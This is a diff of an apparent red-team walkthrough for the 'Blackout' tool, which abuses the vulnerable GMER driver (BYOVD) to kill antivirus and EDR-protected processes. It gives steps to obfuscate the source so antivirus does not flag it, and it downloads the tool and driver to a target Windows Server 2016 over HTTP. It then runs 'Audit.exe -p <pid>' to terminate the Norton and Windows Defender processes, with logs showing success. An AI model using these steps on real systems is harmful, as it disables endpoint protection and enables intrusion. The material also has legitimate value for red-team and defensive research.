@@ -4,14 +4,14 @@ Killing Antivirus/EDR protected processes using the tool 'Blackout' (BYOVD techn
 
 Source: https://github.com/ZeroMemoryEx/Blackout
 
-=> The tool 'Blackout' allows to kill anti-malware (AV and EDR) protected processes using the GMER driver (BYOVD technique - "Bring Your Own Vulnerable Driver").
+=> The tool 'Blackout' allows to kill anti-malware (AV and EDR) protected processes using the GMER driver (BYOVD technique - 'Bring Your Own Vulnerable Driver').
 => It bypasses Hypervisor-protected Code Integrity (HCVI).
 => The sample driver is sourced from the loldrivers website > https://www.loldrivers.io/drivers/7ce8fb06-46eb-4f4f-90d5-5518a6561f15/
 => The tool is composed of an executable file (Blackout.exe) and a driver file (Blackout.sys).
 
 Important note:
 ---------------
-The file "Blackout.exe" is flagged by AV solutions so you need to manually obfuscate the source code before compiling it (or use a packer).
+The file 'Blackout.exe' is flagged by AV solutions so you need to manually obfuscate the source code before compiling it (or use a packer).
 
 
 ==========================================================================================================================================
@@ -24,9 +24,10 @@ Step 1 - Download the source code from GitHub and then obfuscate it and compile 
 
 Very basic obfuscation
 ------------------------
-=> Rename the word "Blackout" by "Audit"
+=> Rename the word 'Blackout' by 'Audit' in the source code 
 => Remove existing comments and add random new comments in the source code
-=> Rename the driver by 'Audit.sys'. 
+=> Rename the .cpp and .sln files by 'audit.cpp' and 'audit.sln'
+=> Rename the driver by 'Audit.sys'
 
 Visual Studio logs
 -------------------
@@ -50,7 +51,7 @@ Mode                 LastWriteTime         Length Name
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 Step 2 - Download the obfuscated version of the tool (renamed as 'Audit.exe') and the vulnerable driver (renamed as 'Audit.sys') in the same folder
-         on the target Windows 2016 server
+         on the target Windows server 2016
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 PS C:\temp > systeminfo
@@ -93,10 +94,10 @@ PS C:\temp > wget -URI http://192.168.1.50:8000/Audit.sys -OutFile Audit.sys
 Important notes regarding the AV solutions running on the target Windows server during my tests
 ------------------------------------------------------------------------------------------------
 => The Windows Defender AV is running, up-to-date and with the real-time protection enabled.
-   There are 2 processes for the Windows Defender AV which are named "MsMpEng" (PID "2028") and "NisSrv" (PID "3436").
+   There are 2 processes for the Windows Defender AV which are named 'MsMpEng' (PID '2028') and 'NisSrv' (PID '3436').
 
-=> The Norton Security Antivirus solution is running, up-to-date and with the real-time protection enabled (however "heuristic check" is Off).
-   There are 2 processes for the Norton Security Antivirus which are named "NortonSecurity" with the PID "1912" and "3704".
+=> The Norton Security Antivirus solution is running, up-to-date and with the real-time protection enabled (however 'heuristic check' is Off).
+   There are 2 processes for the Norton Security Antivirus which are named 'NortonSecurity' with the PID '1912' and '3704'.
 
 PS C:\temp> ps
 
@@ -123,7 +124,7 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
 Step 3 - Run the obfuscated version of the tool with local admin privileges and kill the protected processes of the the Norton AV and the Windows Defender AV
 --------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-=> We run the tool with the command: "Audit.exe -p <pid_of_the_process_to_kill>"
+=> We run the tool with the command: 'Audit.exe -p <pid_of_the_process_to_kill>'
 
 PS C:\temp> .\Audit.exe -p 1912
 driver path: C:\temp\Audit.sys
@@ -156,7 +157,7 @@ Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
    1154      38    84308     111272       2,97   4600   1 powershell
 <SNIP>
 
-=> Result: the Norton AV processes named "NortonSecurity" (with the PID "1912" and "3704") have been killed !!
+=> Result: the Norton AV processes named 'NortonSecurity' (with the PID '1912' and '3704') have been killed !!
 
 
 PS C:\temp> .\Audit.exe -p 2028
